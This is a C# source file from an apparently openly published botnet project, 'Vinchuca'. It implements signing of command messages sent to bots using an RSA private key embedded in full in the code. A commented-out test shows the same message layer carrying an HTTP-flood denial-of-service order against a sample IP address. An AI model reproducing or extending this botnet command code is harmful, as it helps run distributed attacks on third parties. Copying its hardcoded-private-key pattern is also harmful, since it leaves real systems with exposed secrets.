using System;
using System.IO;
using System.Security.Cryptography;
using Vinchuca.Crypto;

namespace Vinchuca.Network.Protocol.Messages.Command
{
    class CommandMessage : Message
    {
        public Guid Nonce { get; set; }
        private byte[] _signedPayload;

        public override byte[] Encode()
        {
            if (_signedPayload == null)
            {
                var payload = base.Encode();
                var signer = new Signature();
                _signedPayload = signer.Sign(payload, GetPrivateKey());
                return _signedPayload;
            }
            return _signedPayload;
        }

        public override void Decode(BinaryReader br)
        {
            base.Decode(br);
            br.BaseStream.Seek(0, SeekOrigin.Begin);
            _signedPayload = br.ReadBytes(4 * 1024);
            var signer = new Signature();
            signer.Verify(_signedPayload);
        }

        //public void test()
        //{
        //    var ddos = new DosAttackMessage()
        //    {
        //        Nonce = Guid.NewGuid(),
        //        AttackId = 123456,
        //        Target = new IPEndPoint(IPAddress.Parse("200.200.200.1"), 80),
        //        Threads = 4,
        //        Type = DosAttackMessage.DosType.HttpFlood,
        //        Buffer = new byte[0]
        //    };

        //    var encoded = ddos.Encode();
        //    var other = new DosAttackMessage();
        //    other.Decode(new BinaryReader(new MemoryStream(encoded)));
        //}

        public RSACryptoServiceProvider GetPrivateKey()
        {
            var privKeyStr = 
@"MIICXQIBAAKBgQDEuMdX757iaBkrxN51IQMILf+o7nJhfddEQ8gurVNYgoGxg19N
ZtrJaegAiv6lbFO4jhkKzLX9mHXZrvxL+UD5lr458BA8vwm+ws7lxu+10exq0Xns
H26ekvBveDcbndhX+fbc34HhZlJCib6MKMzUGebwckGbZK3oz4WCZc3QoQIDAQAB
AoGBALBWWgpPNwMIARgk3qvrrYYVhYhuRYVyghYlFDoTEBTU12DBvBnrys6k6lwi
O+UY12slpPjzS2dI1MsOegW4Ji5/6w/rZC8BoyvOADSVWKc71eaQ8d9IqjjWKp0+
cL9hgI8s/DDYUtqmrqsxqPGkxOx8NSD7VcSID7xbbqK/v5uJAkEA+hurMyJUPRCD
Uyfie1m+cfQKjc4j4zN32KrbceG25QJq8Y/lpQSq0POSsmvaIxGkRJtTIoB6T/co
TYvox/kUiwJBAMlbJvyjm2KY12CTFjN7apmnMIRoYmI9z8n4hLl2h8852s+Ljdjn
MrCOcsL0T0kvxLlAKDwAeVWtjil3A9/DGQMCQAJPERSGw5pQtbWlz5xt5qkspJBM
j95AEmIoqZ/ygnq4u/4A4xDT6zPEm90Ty865EfgkKu9NmlN0p6WXng2CiiMCQEND
nQmGihDs5/4OBLub/edob4+74ynYZkKdL5FZJFM4i30LrI4J5egPHg08WgQj3f7Y
jNhGfEH/4V6+sF+eqAsCQQCTl/A2JqF6CThIdk6zLF40cJGRFOkAcRqsrV3Q64XD
C2rpXXqnjJlqysIFEmnUmxm64ckMyg96b1CxeW0F4Tr7";
            var privKey = Convert.FromBase64String(privKeyStr);
            var prvRsa  = RsaUtils.LoadPrivateKey(privKey);
            return prvRsa;
        }
    }
}
